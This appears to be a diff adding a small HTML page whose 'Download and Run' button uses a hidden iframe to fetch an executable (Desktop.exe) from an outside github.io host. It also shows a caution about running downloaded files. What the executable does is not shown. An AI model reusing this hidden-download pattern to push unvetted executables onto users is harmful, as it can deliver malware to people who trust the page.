@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Download and Run EXE</title>
+<script>
+function downloadAndRun() {
+  // Replace with the actual URL of your EXE file.
+  const exeUrl = "https://prakul536.github.io/WIN-0666/Desktop.exe";
+
+  // Create a hidden iframe for the download.
+  const iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.src = exeUrl;
+  document.body.appendChild(iframe);
+
+    //Inform the user that the download should have started.
+    alert("The download should have started. Please check your downloads folder.");
+
+  // Note: Directly running an EXE from the browser is generally not possible 
+  // due to security restrictions. The user will have to manually run it after downloading.
+}
+</script>
+</head>
+<body>
+
+<h1>Download EXE</h1>
+
+<button onclick="downloadAndRun()">Download and Run</button>
+
+<p>
+  <strong>Important Security Information:</strong> Browsers do not allow direct execution of downloaded files for security reasons. After the download completes, you will need to manually locate the file in your downloads folder and run it. Be extremely cautious when downloading and running executable files from the internet, as they can potentially harm your computer. Only download files from trusted sources.
+</p>
+
+</body>
+</html>
